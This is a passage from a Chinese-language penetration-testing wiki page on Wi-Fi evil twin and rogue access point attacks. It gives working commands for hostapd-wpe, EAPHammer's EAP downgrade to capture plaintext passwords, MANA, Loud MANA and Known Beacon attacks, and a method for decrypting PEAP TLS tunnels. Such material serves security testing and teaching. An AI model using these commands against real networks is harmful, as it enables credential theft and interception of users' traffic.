**使用 hostapd-wpe**

`hostapd-wpe` 需要一个 **配置** 文件才能工作。要 **自动化** 这些配置的生成，你可以使用 [https://github.com/WJDigby/apd_launchpad](https://github.com/WJDigby/apd_launchpad)（下载放在 _/etc/hostapd-wpe/_ 里的 python 文件）
```bash
./apd_launchpad.py -t victim -s PrivateSSID -i wlan0 -cn company.com
hostapd-wpe ./victim/victim.conf -s
```
在配置文件中，您可以选择许多不同的内容，例如 ssid、channel、user files、cret/key、dh parameters、wpa version 和 auth...

[**Using hostapd-wpe with EAP-TLS to allow any certificate to login.**](evil-twin-eap-tls.md)

**使用 EAPHammer**
```bash
# Generate Certificates
./eaphammer --cert-wizard

# Launch Attack
./eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CorpWifi --creds
```
默认情况下，EAPHammer 使用以下认证方法（注意 GTC 是首先尝试获取明文密码的方式，然后再使用更强的认证方法）：
```
GTC,MSCHAPV2,TTLS-MSCHAPV2,TTLS,TTLS-CHAP,TTLS-PAP,TTLS-MSCHAP,MD5
```
这是默认的方法，以避免较长的连接时间。不过，你也可以指定服务器按从最弱到最强的顺序使用认证方法：
```
--negotiate weakest
```
或者你也可以使用：

- `--negotiate gtc-downgrade` 以使用高效的 GTC 降级实现（明文密码）
- `--negotiate manual --phase-1-methods PEAP,TTLS --phase-2-methods MSCHAPV2,GTC,TTLS-PAP` 手动指定提供的方法（按与目标组织相同的顺序提供相同的认证方法会更难被检测到）。
- [Find more info in the wiki](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)

**Using Airgeddon**

`Airgeddon` 可以使用之前生成的证书为 WPA/WPA2-Enterprise 网络提供 EAP 认证。伪造网络会将连接协议降级为 EAP-MD5，从而能够捕获用户及密码的 MD5。随后，攻击者可以尝试破解密码。\
`Airggedon` 为你提供了执行 **连续的 Evil Twin 攻击（noisy）** 或 **仅在有人连接前创建 Evil Attack（smooth）** 的选项。

![](<../../images/image (936).png>)

### Debugging PEAP and EAP-TTLS TLS tunnels in Evil Twins attacks

_此方法在 PEAP 连接中测试，但由于我是在解密任意 TLS 隧道，因此这也应适用于 EAP-TTLS_

在 `hostapd-wpe` 的 **configuration** 中将包含 **dh_file** 的那一行注释掉（从 `dh_file=/etc/hostapd-wpe/certs/dh` 到 `#dh_file=/etc/hostapd-wpe/certs/dh`）\
这样 `hostapd-wpe` 将使用 **RSA** 而非 **DH** 交换密钥，因此在知道服务器私钥的情况下你可以随后 **解密** 流量。

现在按通常方式使用修改后的配置启动 **Evil Twin**（使用 `hostapd-wpe`）。同时，在执行 Evil Twin 攻击的 **interface** 上启动 `wireshark`。

现在或稍后（当你已经捕获到一些认证尝试时）你可以将私有 RSA 密钥添加到 wireshark，路径：Edit --> Preferences --> Protocols --> TLS --> (RSA keys list) Edit...

添加一个新条目并用以下值填写表单：**IP address = any** -- **Port = 0** -- **Protocol = data** -- **Key File**（**选择你的密钥文件**，为避免问题请选择未设置密码保护的密钥文件）。

![](<../../images/image (687).png>)

并查看新的 **"Decrypted TLS" tab**：

![](<../../images/image (231).png>)

## KARMA, MANA, Loud MANA and Known beacons attack

### ESSID and MAC black/whitelists

不同类型的 Media Access Control Filter Lists (MFACLs) 及其对应的模式和对恶意 Access Point (AP) 行为的影响：

1. **MAC-based Whitelist**:
- Rogue AP 仅响应列在白名单中的设备的 probe requests，对未列出的所有其他设备保持不可见。
2. **MAC-based Blacklist**:
- Rogue AP 会忽略列在黑名单中的设备的 probe requests，从而对这些特定设备保持不可见。
3. **SSID-based Whitelist**:
- Rogue AP 仅响应列出的特定 ESSIDs 的 probe requests，使得其对首选网络列表 (Preferred Network Lists, PNLs) 中不包含这些 ESSID 的设备不可见。
4. **SSID-based Blacklist**:
- Rogue AP 不会响应列在黑名单中的特定 ESSIDs 的 probe requests，使得其对寻求这些特定网络的设备不可见。
```bash
# example EAPHammer MFACL file, wildcards can be used
09:6a:06:c8:36:af
37:ab:46:7a:9a:7c
c7:36:8c:b2:*:*

[--mac-whitelist /path/to/mac/whitelist/file.txt #EAPHammer whitelisting]
[--mac-blacklist /path/to/mac/blacklist/file.txt #EAPHammer blacklisting]
```

```bash
# example ESSID-based MFACL file
name1
name2
name3

[--ssid-whitelist /path/to/mac/whitelist/file.txt]
[--ssid-blacklist /path/to/mac/blacklist/file.txt]
```
### KARMA

该方法允许攻击者创建一个恶意的 access point (AP)，对试图连接网络的设备发出的所有 probe requests 做出响应。该技术通过模仿设备正在搜索的网络来欺骗设备连接到攻击者的 AP。一旦设备向这个 rogue AP 发送连接请求并完成连接，设备就会错误地连接到攻击者的网络。

### MANA

随后，设备开始忽略不可靠的网络响应，降低了原始 karma attack 的有效性。然而，由 Ian de Villiers 和 Dominic White 引入了一种称为 MANA attack 的新方法。该方法通过 rogue AP 对设备的 broadcast probe requests 使用设备先前已知的网络名 (SSIDs) 作出响应，从而捕获设备的 Preferred Network Lists (PNL)。这种复杂的攻击通过利用设备记住和优先已知网络的方式，规避了针对原始 karma attack 的防护。

MANA attack 的运作方式是监听设备的 directed 和 broadcast probe requests。对于 directed 请求，它会记录设备的 MAC address 和所请求的网络名，并将这些信息加入列表。当收到 broadcast 请求时，AP 会响应与设备列表中任一网络匹配的信息，从而诱使设备连接到该 rogue AP。
```bash
./eaphammer -i wlan0 --cloaking full --mana --mac-whitelist whitelist.txt [--captive-portal] [--auth wpa-psk --creds]
```
### Loud MANA

A **Loud MANA attack** 是一种高级策略，适用于设备不使用定向探测或其 Preferred Network Lists (PNL) 对攻击者未知的情况。它基于这样一个原理：**处于同一区域的设备很可能在其 PNLs 中共享一些网络名称**。与选择性响应不同，这种攻击会对所有被观测设备合并 PNLs 中出现的每个网络名称 (ESSID) 广播 probe responses。这样更广泛的做法增加了某个设备识别熟悉网络并尝试连接到 rogue Access Point (AP) 的机会。
```bash
./eaphammer -i wlan0 --cloaking full --mana --loud [--captive-portal] [--auth wpa-psk --creds]
```
### Known Beacon attack

当 **Loud MANA attack** 可能不足以奏效时，**Known Beacon attack** 提供了另一种方法。该方法 **通过模拟一个对任何 network name 都响应的 AP，循环遍历从 wordlist 衍生的潜在 ESSIDs 列表，来对连接过程进行暴力破解。** 这会模拟大量网络的存在，希望能匹配受害者 PNL 中的某个 ESSID，从而触发设备尝试连接到虚构的 AP。可以通过将该攻击与 `--loud` 选项结合来放大攻击效果，以更积极地诱捕设备。

Eaphammer 将该攻击实现为一种 MANA attack，使列表中的所有 ESSIDs 都被广播（你也可以将其与 `--loud` 结合以创建 Loud MANA + Known beacons attack）：
```bash
./eaphammer -i wlan0 --mana [--loud] --known-beacons  --known-ssids-file wordlist.txt [--captive-portal] [--auth wpa-psk --creds]
```
**Known Beacon Burst attack**

该 **Known Beacon Burst attack** 涉及 **对文件中列出的每个 ESSID 进行 beacon frames 的快速广播**。这会在目标区域制造一个密集的 fake networks 环境，大大提高设备连接到 rogue AP 的可能性，尤其是在与 MANA attack 结合时。该技术利用速度和数量来压倒设备的网络选择机制。
```bash
# transmit a burst of 5 forged beacon packets for each entry in list
./forge-beacons -i wlan1 \
--bssid de:ad:be:ef:13:37 \
--known-essids-file known-s.txt \
--dst-addr 11:22:33:11:22:33 \
--burst-count 5
```
## Wi-Fi Direct

**Wi-Fi Direct** 是一种协议，允许设备通过 Wi-Fi 直接相互连接，而无需传统的无线接入点。该功能集成在多种 Internet of Things (IoT) 设备中，例如打印机和电视，从而便于设备间的直接通信。Wi-Fi Direct 的一个显著特征是其中一台设备会承担接入点的角色，被称为 group owner，以管理连接。

Security for Wi-Fi Direct connections is established through **Wi-Fi Protected Setup (WPS)**, which supports several methods for secure pairing, including:

- **Push-Button Configuration (PBC)**
- **PIN entry**
- **Near-Field Communication (NFC)**

这些方法，尤其是 PIN entry，容易受到与传统 Wi-Fi 网络中的 WPS 相同的漏洞影响，因此会成为类似攻击向量的目标。

### EvilDirect Hijacking

**EvilDirect Hijacking** 是针对 Wi-Fi Direct 的一种攻击。它类似于 Evil Twin 攻击的概念，但针对的是 Wi-Fi Direct 连接。在这种情形中，攻击者冒充合法的 group owner，目的是诱使设备连接到恶意实体。可以使用像 `airbase-ng` 这样的工具执行该方法，通过指定要冒充设备的信道、ESSID 和 MAC address 来实现：

## References

- [https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee](https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee)
- [https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9](https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9)
- [https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38](https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38)
- [https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d](https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d)
- [https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf](https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf)
- [http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)
- [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
- [https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d](https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d)
- [https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)](<https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)>)
- [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
- [The vulnerability that killed FreeWifi_Secure](https://7h30th3r0n3.fr/the-vulnerability-that-killed-freewifi_secure/)
- [RFC 4186 – EAP-SIM Authentication](https://datatracker.ietf.org/doc/html/rfc4186)
- [3GPP TS 33.402 – 3GPP system architecture evolution (SAE); Security aspects of non-3GPP accesses](https://www.3gpp.org/ftp/Specs/archive/33_series/33.402/)


TODO: 查看 [https://github.com/wifiphisher/wifiphisher](https://github.com/wifiphisher/wifiphisher)（使用 facebook 登录并在 captive portals 中模拟 WPA）

{{#include ../../banners/hacktricks-training.md}}
